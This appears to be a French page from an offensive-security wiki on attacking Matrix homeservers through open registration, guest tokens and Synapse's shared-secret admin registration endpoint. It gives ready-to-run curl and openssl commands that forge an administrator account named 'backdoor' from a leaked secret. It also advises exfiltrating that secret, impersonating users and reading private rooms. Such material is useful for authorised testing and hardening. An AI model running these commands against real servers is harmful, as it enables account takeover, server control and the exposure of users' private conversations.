---
title: "Authentification : inscription ouverte, accès invité et création d'administrateur par secret partagé"
description: "Un homeserver Matrix avec inscription ouverte distribue des comptes via le point de terminaison register de l'API client-serveur avec une seule étape de connexion factice. L'inscription invité produit un jeton limité sans aucun identifiant. Sur Synapse, le point de terminaison admin d'inscription par secret partagé accepte un HMAC calculé à partir du registration_shared_secret, de sorte qu'un secret divulgué permet à un attaquant de créer directement un administrateur."
keywords:
  - Matrix registration
  - guest access
  - shared secret
  - Synapse admin
  - HMAC registration
---

# Authentification

L'entrée dans Matrix comporte trois chemins pertinents pour l'attaquant. L'inscription ouverte via `/_matrix/client/v3/register` crée un compte normal lorsque le serveur n'offre que l'étape `m.login.dummy`, ce qui est courant sur les instances auto-hébergées. L'accès invité via le même point de terminaison avec `kind=guest` produit un jeton restreint mais réel sans aucune saisie. Et le chemin le plus puissant est l'inscription par secret partagé de Synapse : le point de terminaison admin `/_synapse/admin/v1/register` s'authentifie non pas avec une session mais avec un HMAC-SHA1 sur le nonce, le nom d'utilisateur, le mot de passe et le drapeau admin, avec pour clé le `registration_shared_secret` du serveur, de sorte que la possession de ce secret permet de créer directement un administrateur, contournant entièrement le flux d'inscription normal.

## Prérequis

Pour l'inscription ouverte et invité, le point de terminaison register doit accepter le flux (confirmé dans l'[énumération](enumeration.md) : une réponse `flows` avec une étape `m.login.dummy`). Pour la création d'administrateur par secret partagé, vous avez besoin de la valeur `registration_shared_secret` du `homeserver.yaml` de Synapse, obtenue depuis une fuite de configuration, une sauvegarde lisible, un dépôt ou un point d'ancrage sur l'hôte, et le chemin `/_synapse/admin/v1/register` doit être routé (un `200` sur `server_version`).

## Inscription ouverte et invité

```bash
# open registration: submit the dummy stage with the session from the initial probe
SESSION=$(curl -s -X POST https://target.lan/_matrix/client/v3/register -d '{}' | jq -r .session)
curl -s -X POST https://target.lan/_matrix/client/v3/register -H 'Content-Type: application/json' \
  -d "{\"auth\":{\"type\":\"m.login.dummy\",\"session\":\"$SESSION\"},\"username\":\"recon\",\"password\":\"Autumn2026!\"}"
# {"user_id":"@recon:target.lan","access_token":"syt_...","device_id":"..."}  => account created

# guest access: a token with no credential at all
curl -s -X POST "https://target.lan/_matrix/client/v3/register?kind=guest" -d '{}'
# returns an access_token for a guest user, enough to read world-readable rooms and the directory
```

L'`access_token` renvoyé est un jeton bearer : passez-le sous la forme `Authorization: Bearer syt_...` sur chaque requête ultérieure pour exécuter une énumération authentifiée, rejoindre des salons et atteindre les points de terminaison pour lesquels la recherche d'annuaire exigeait un jeton.

## Création d'administrateur par secret partagé

Le point de terminaison register admin est un flux nonce/HMAC en deux étapes. Récupérez le nonce, calculez le MAC, et soumettez :

```bash
BASE=https://target.lan
SECRET='the_registration_shared_secret_from_homeserver_yaml'
NONCE=$(curl -s $BASE/_synapse/admin/v1/register | jq -r .nonce)
USER=backdoor; PASS='Winter2026!'; ADMIN=admin

# MAC = HMAC-SHA1(secret, nonce\0user\0pass\0admin) over NUL-separated fields
MAC=$(printf '%s\0%s\0%s\0%s' "$NONCE" "$USER" "$PASS" "$ADMIN" \
  | openssl dgst -sha1 -hmac "$SECRET" | awk '{print $2}')

curl -s -X POST $BASE/_synapse/admin/v1/register -H 'Content-Type: application/json' -d \
  "{\"nonce\":\"$NONCE\",\"username\":\"$USER\",\"password\":\"$PASS\",\"admin\":true,\"mac\":\"$MAC\"}"
# {"user_id":"@backdoor:target.lan","access_token":"syt_...","device_id":"..."}  => you are now an admin
# {"errcode":"M_UNKNOWN","error":"HMAC incorrect"}  => wrong secret or mis-ordered fields
```

Un `user_id` avec un `access_token` tout neuf signifie que le compte existe et qu'`admin:true` a été honoré, donc le jeton pilote l'intégralité de l'API admin de Synapse : lister et désactiver des utilisateurs, réinitialiser des mots de passe, lire l'état de n'importe quel salon, et purger ou exporter des salons. Une erreur `HMAC incorrect` signifie que le secret est erroné ou que l'ordre des champs/séparateurs NUL est incorrect ; les champs doivent être exactement `nonce`, `username`, `password`, et la chaîne littérale `admin` ou `notadmin`, jointes par NUL.

## Suite

- Tout jeton (ouvert, invité ou admin) est l'identifiant pour l'énumération authentifiée et pour envoyer des messages à de vrais utilisateurs afin de pivoter socialement.
- Le jeton admin est un contrôle du serveur : désactiver ou usurper des utilisateurs, lire l'historique des salons privés, et, combiné à l'[exploitation serveur](server-exploitation.md), atteindre l'hôte derrière le homeserver.
- Le `registration_shared_secret` lui-même mérite d'être exfiltré depuis tout accès à la configuration précisément parce qu'il réduit la création d'administrateur à une seule requête pour toujours, jusqu'à ce que le secret soit changé.

## Références

- [Matrix client-server API (account registration)](https://spec.matrix.org/latest/client-server-api/#account-registration-and-management)
- [Synapse admin register endpoint](https://element-hq.github.io/synapse/latest/admin_api/register_api.html)
- [Synapse admin API documentation](https://element-hq.github.io/synapse/latest/usage/administration/admin_api/index.html)
